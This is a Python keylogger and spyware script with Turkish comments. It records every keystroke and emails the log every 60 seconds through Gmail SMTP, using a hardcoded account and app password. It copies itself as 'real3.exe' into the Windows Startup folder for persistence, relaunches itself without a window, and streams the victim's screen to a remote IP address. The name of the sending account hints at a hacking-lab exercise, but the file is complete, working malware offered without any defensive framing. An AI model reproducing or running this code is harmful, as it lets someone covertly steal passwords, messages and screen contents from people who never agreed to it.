import smtplib
import time
import pyautogui
import pynput.keyboard
import threading
import os
import shutil
import subprocess
import ctypes
import winreg
import sys
from vidstream import ScreenShareClient



log = ''

def callback_function(key):
    global log
    try:
        #log = log + key.char.encode('utf-8')
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.tab:
            log = log + 'tab'  # Sekme tuşuna basıldıysa, log değişkenine 'tab' ekler
        elif key == key.backspace:
            log += 'silme'  # Geri tuşuna basıldıysa, log değişkenine 'silme' ekler
        elif key == key.enter:
            log += 'enter'  
        elif key == key.ctrl_l:
            log += 'ctrl_1'
        elif log == key.ctrl_r:
            log += 'ctrl_r'
        elif log == key.alt_l:
            log += 'alt_1'
        elif log == key.alt_gr:
            log += 'alt_r'
        elif log == key.cmd:
            log += 'win'
        elif log == key.cmd_r:
            log += 'win_r'
        elif log == key.menu:
            log += 'fn'
        else:
            log = log + str(key)
    except:
        pass

    print(log)


def sender_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()
    

def screensharing():
    baglanti = ScreenShareClient('192.168.100.133', 9999)
    baglanti.start_stream()

def thread_function():
    global log
    sender_email("rastgeletryhackme@gmail.com", "emiokybnnrttvizv", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(60,thread_function)
    timer_object.start()


def copy_to_startup():
    try:
        # Başlangıç klasörünü belirle
        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

        # Kopyalanacak dosyanın adını ve kaynak yolunu belirle
        source_filename = 'real3.exe'
        source_path = os.path.abspath(source_filename)

        # Hedef yol oluştur
        destination = os.path.join(startup_folder, source_filename)

        # Dosyayı başlangıç klasörüne kopyala
        shutil.copyfile(source_path, destination)

        # Dosyayı çalıştır
        subprocess.Popen(destination, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        screensharing()
        # print(f"{source_filename} başarıyla başlangıç klasörüne kopyalandı ve çalıştırıldı.")

    except Exception as e:
        pass
        # print(f"Hata oluştu: {str(e)}")
    


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)



copy_to_startup()
keylogger_listener.start()
thread_function()
keylogger_listener.join()   
